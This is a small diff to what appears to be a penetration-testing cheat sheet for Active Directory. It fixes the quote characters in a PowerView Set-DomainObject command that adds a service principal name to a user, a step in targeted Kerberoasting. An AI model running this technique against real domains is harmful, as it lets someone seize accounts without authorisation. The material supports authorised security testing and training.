@@ -222,7 +222,7 @@ Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectD
 - Format ```<STRING>/<STRING>```
 ```
 . ./PowerView_dev.ps1
-Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatever1>’}
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname='<ops/whatever1>'}
 ```
 
 #### Then Kerberoast user
